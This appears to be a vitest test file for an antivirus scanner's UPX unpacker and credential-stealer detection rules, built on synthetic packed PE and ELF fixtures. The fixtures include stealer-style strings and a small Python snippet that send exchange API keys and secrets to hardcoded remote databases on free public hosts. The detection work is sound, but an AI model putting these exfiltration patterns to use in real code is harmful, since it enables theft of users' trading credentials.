import { describe, expect, it } from 'vitest';
import { findRemoteDsn, findUpxHeader, nrvDecompress, scanBytes, upxUnpack, type AvFileResult } from '../index';

/**
 * Fixtures are synthetic: a minimal UCL-compatible encoder (literals plus the
 * real end-of-stream prefix codes) builds UPX-shaped PE and ELF files, so no
 * real malware lives in the repo. The decoder itself was checked against
 * UPX 4.2.4 output (win64/pe NRV2E; linux/amd64 NRV2B/2D/2E) by hand.
 */

const latin1 = (s: string) => Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff);
const ids = (r: AvFileResult) => r.detections.map((d) => d.id);

/** UCL LE32 bit writer: 32-bit words, MSB first, reserved before the bytes that follow. */
class BitWriter {
  out: number[] = [];
  private word = 0;
  private n = 0;
  private at = -1;
  bit(b: number) {
    if (this.n === 0) {
      this.at = this.out.length;
      this.out.push(0, 0, 0, 0);
    }
    this.word = ((this.word << 1) | (b & 1)) >>> 0;
    if (++this.n === 32) this.flush();
  }
  byte(v: number) {
    this.out.push(v & 0xff);
  }
  flush() {
    if (this.n === 0) return;
    const w = (this.word << (32 - this.n)) >>> 0;
    this.out[this.at] = w & 0xff;
    this.out[this.at + 1] = (w >>> 8) & 0xff;
    this.out[this.at + 2] = (w >>> 16) & 0xff;
    this.out[this.at + 3] = (w >>> 24) & 0xff;
    this.word = 0;
    this.n = 0;
  }
}

function prefixSs11(w: BitWriter, i: number) {
  if (i >= 2) {
    let t = 4;
    i += 2;
    do t *= 2;
    while (i >= t);
    t /= 2; // the leading 1 is implicit
    do {
      t /= 2;
      w.bit(Math.floor(i / t) & 1);
      w.bit(0);
    } while (t > 2);
  }
  w.bit(i & 1);
  w.bit(1);
}

function prefixSs12(w: BitWriter, i: number) {
  if (i >= 2) {
    let t = 2;
    do {
      i -= t;
      t *= 4;
    } while (i >= t);
    do {
      t /= 2;
      w.bit(Math.floor(i / t) & 1);
      w.bit(0);
      t /= 2;
      w.bit(Math.floor(i / t) & 1);
    } while (t > 2);
  }
  w.bit(i & 1);
  w.bit(1);
}

/** Elias-gamma style length: implicit leading 1, then (bit, stop-flag) pairs. */
function gamma(w: BitWriter, v: number) {
  const bits = v.toString(2).slice(1);
  for (let i = 0; i < bits.length; i++) {
    w.bit(bits[i] === '1' ? 1 : 0);
    w.bit(i === bits.length - 1 ? 1 : 0);
  }
}

/** A distance-1 match copying `n` (>= 8) bytes: how a run of one byte compresses. */
function runMatch(w: BitWriter, method: 'nrv2b' | 'nrv2d' | 'nrv2e', n: number) {
  w.bit(0); // end of literals
  w.bit(1); // offset prefix → 3 (explicit offset byte follows)
  w.bit(1);
  if (method === 'nrv2b') {
    w.byte(0); // distance 1
    w.bit(0);
    w.bit(0); // length 0 → gamma
    gamma(w, n - 3);
  } else {
    w.byte(1); // distance 1, low length bit 0
    if (method === 'nrv2d') {
      w.bit(0);
      gamma(w, n - 3);
    } else {
      w.bit(0); // not the 3-4 short form
      gamma(w, n - 4);
    }
  }
}

/** NRV stream of literals plus run-length matches; real UPX stubs decode it too. */
function nrvLiterals(method: 'nrv2b' | 'nrv2d' | 'nrv2e', data: Uint8Array): Uint8Array {
  const w = new BitWriter();
  for (let i = 0; i < data.length; ) {
    w.bit(1);
    w.byte(data[i]);
    let run = 0;
    while (i + 1 + run < data.length && data[i + 1 + run] === data[i]) run++;
    if (run >= 8) {
      runMatch(w, method, run);
      i += 1 + run;
    } else i++;
  }
  w.bit(0);
  if (method === 'nrv2b') prefixSs11(w, 0x1000000);
  else prefixSs12(w, 0x1000000);
  w.byte(0xff);
  w.flush();
  return Uint8Array.from(w.out);
}

const METHOD_ID = { nrv2b: 2, nrv2d: 5, nrv2e: 8 } as const;

function packHeader(method: keyof typeof METHOD_ID, format: number, uLen: number, cLen: number): Uint8Array {
  const h = new Uint8Array(32);
  h.set(latin1('UPX!'));
  h[4] = 13;
  h[5] = format;
  h[6] = METHOD_ID[method];
  h[7] = 9;
  const dv = new DataView(h.buffer);
  dv.setUint32(16, uLen, true);
  dv.setUint32(20, cLen, true);
  return h;
}

/** Windows layout: MZ header, pack header, stream directly after it. */
function upxPe(payload: string, method: keyof typeof METHOD_ID = 'nrv2e'): Uint8Array {
  const data = latin1(payload + '\0'.repeat(4096));
  const stream = nrvLiterals(method, data);
  const out = new Uint8Array(0x205 + 32 + stream.length + 64);
  out[0] = 0x4d;
  out[1] = 0x5a;
  out.set(packHeader(method, 36, data.length, stream.length), 0x205);
  out.set(stream, 0x225);
  return out;
}

/** ELF layout: b_info blocks (one compressed, one stored) and the pack header at the end. */
function upxElf(payload: string, method: keyof typeof METHOD_ID = 'nrv2b'): Uint8Array {
  const data = latin1(payload + '\0'.repeat(4096));
  const stream = nrvLiterals(method, data);
  const stored = latin1('stored-segment-bytes');
  const bInfo = (unc: number, cpr: number, m: number) => {
    const b = new Uint8Array(12);
    const dv = new DataView(b.buffer);
    dv.setUint32(0, unc, true);
    dv.setUint32(4, cpr, true);
    b[8] = m;
    return b;
  };
  const parts = [
    Uint8Array.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]),
    new Uint8Array(0xf8),
    bInfo(data.length, stream.length, METHOD_ID[method]),
    stream,
    bInfo(stored.length, stored.length, METHOD_ID[method]),
    stored,
    new Uint8Array(16),
    packHeader(method, 22, data.length + stored.length, stream.length + stored.length),
  ];
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.length;
  }
  return out;
}

// What the 2026-11-22 sample carried, with the credentials replaced.
const STEALER_STRINGS =
  'Gate.io API Key\x00https://api.gateio.ws/api/v4/futures/usdt/orders\x00' +
  '2695994666715063979466701508701963067355791626002630814351006629888126959946667150639794' +
  'dropuser:Xk92mQpL0vZz@mysql5.sqlpub.com:3310/drop1?charset=utf8mb4\x00' +
  'INSERT INTO api_keys (key_val, secret_val, exchange_name) VALUES (?, ?, ?)\x00';

describe('UPX unpacking', () => {
  for (const method of ['nrv2b', 'nrv2d', 'nrv2e'] as const) {
    it(`round-trips a ${method} stream`, () => {
      const data = latin1('hello, packed world '.repeat(50) + 'z'.repeat(300) + 'end');
      const out = nrvDecompress(method, nrvLiterals(method, data), 0, data.length);
      expect([...out]).toEqual([...data]);
    });
  }

  it('unpacks a PE whose stream follows the pack header', () => {
    const r = upxUnpack(upxPe('inner-secret-string'));
    expect(r?.info.method).toBe('nrv2e');
    expect(r?.info.format).toBe(36);
    expect(new TextDecoder().decode(r!.bytes!)).toBe('inner-secret-string' + '\0'.repeat(4096));
  });

  it('unpacks an ELF b_info chain, including stored blocks', () => {
    const r = upxUnpack(upxElf('compressed-segment'));
    expect(new TextDecoder().decode(r!.bytes!)).toBe('compressed-segment' + '\0'.repeat(4096) + 'stored-segment-bytes');
  });

  it('ignores a UPX! string that is not a valid pack header', () => {
    const b = new Uint8Array(4096);
    b[0] = 0x4d;
    b[1] = 0x5a;
    b.set(latin1('this file mentions UPX! in passing'), 100);
    expect(findUpxHeader(b)).toBeNull();
  });

  it('reports LZMA packing as packed but not inspected', () => {
    const b = upxPe('x'.repeat(64));
    b[0x205 + 6] = 14;
    const r = upxUnpack(b);
    expect(r?.info.method).toBe('lzma');
    expect(r?.bytes).toBeNull();
  });

  it('never throws on corrupt streams and caps output', () => {
    const b = upxPe('y'.repeat(4000));
    for (let i = 0x230; i < b.length; i += 7) b[i] ^= 0x5a;
    expect(() => upxUnpack(b)).not.toThrow();
    expect(() => nrvDecompress('nrv2e', Uint8Array.from([0, 0, 0, 0]), 0, 10)).toThrow(RangeError);
  });
});

describe('credential-stealer rules', () => {
  it('flags a UPX-packed exchange key stealer even when named .exe', async () => {
    const r = await scanBytes({ name: 'futures-trader.exe', bytes: upxPe(STEALER_STRINGS) });
    expect(r.verdict).toBe('malicious');
    expect(ids(r)).toEqual(
      expect.arrayContaining([
        'CrushAV.Packer.UPX',
        'CrushAV.Stealer.SecretsToHardcodedDatabase',
        'CrushAV.Stealer.ExchangeKeyHarvester',
        'CrushAV.Suspicious.FreePublicDatabase',
      ]),
    );
    expect(r.detections.find((d) => d.id === 'CrushAV.Stealer.ExchangeKeyHarvester')?.description).toMatch(/inside the UPX-packed program/);
  });

  it('flags the same stealer unpacked, in an ELF, and saved as .txt', async () => {
    const plain = new Uint8Array(512 + STEALER_STRINGS.length);
    plain[0] = 0x4d;
    plain[1] = 0x5a;
    plain.set(latin1(STEALER_STRINGS), 512);
    expect((await scanBytes({ name: 'futures-trader.exe', bytes: plain })).verdict).toBe('malicious');
    expect((await scanBytes({ name: 'trader', bytes: upxElf(STEALER_STRINGS) })).verdict).toBe('malicious');
    const txt = await scanBytes({ name: 'futures-trader.txt', bytes: upxPe(STEALER_STRINGS) });
    expect(ids(txt)).toContain('CrushAV.Disguise.ExecutableAsDocument');
  });

  it('flags a Python stealer script', async () => {
    const py =
      'import pymysql, ccxt\nURL = "https://api.binance.com/api/v3/account"\n' +
      'DSN = "mysql://k:Hq73nnPz01@sql.freedb.tech:3306/keys"\n' +
      'cur.execute("INSERT INTO creds (api_key, api_secret) VALUES (%s, %s)", (k, s))\n';
    const r = await scanBytes({ name: 'bot.py', bytes: latin1(py) });
    expect(r.verdict).toBe('malicious');
  });

  it('leaves a UPX-packed program with no stealer strings clean', async () => {
    const r = await scanBytes({ name: 'tool.exe', bytes: upxPe('ordinary program strings, nothing to see') });
    expect(r.verdict).toBe('clean');
    expect(ids(r)).toEqual(['CrushAV.Packer.UPX']);
  });

  it('does not flag a legit trading bot that talks only to the exchange', async () => {
    const py = 'import ccxt\nex = ccxt.gateio({"apiKey": os.environ["K"], "secret": os.environ["S"]})\nrequests.get("https://api.gateio.ws/api/v4/spot/tickers")\n';
    expect((await scanBytes({ name: 'bot.py', bytes: latin1(py) })).verdict).toBe('clean');
  });

  it('does not flag docs, source files or placeholder DSNs', async () => {
    const doc = 'Use user:password@tcp(localhost:3306)/dbname or mysql://root:${DB_PASS}@db.example.com/app\nINSERT INTO api_keys (key_val, secret_val) VALUES (?, ?)';
    expect((await scanBytes({ name: 'README.md', bytes: latin1(doc + ' api.binance.com') })).verdict).toBe('clean');
    expect((await scanBytes({ name: 'main.go', bytes: latin1(STEALER_STRINGS) })).verdict).toBe('clean');
    const pe = new Uint8Array(512 + doc.length);
    pe[0] = 0x4d;
    pe[1] = 0x5a;
    pe.set(latin1(doc), 512);
    expect((await scanBytes({ name: 'app.exe', bytes: pe })).verdict).toBe('clean');
  });

  it('findRemoteDsn skips placeholders and private hosts', () => {
    expect(findRemoteDsn('app:%s@tcp(db.prod.example.net:3306)/x')).toBeNull();
    expect(findRemoteDsn('app:s3cretpw@tcp(10.0.0.5:3306)/x')).toBeNull();
    expect(findRemoteDsn('app:s3cretpw@tcp(localhost:3306)/x')).toBeNull();
    expect(findRemoteDsn('app:s3cretpw@tcp(db.attacker.top:3306)/x')).toEqual({ user: 'app', host: 'db.attacker.top' });
    expect(findRemoteDsn('postgres://u:Zq81mmmA@1.2.3.4:5432/x')?.host).toBe('1.2.3.4');
  });
});
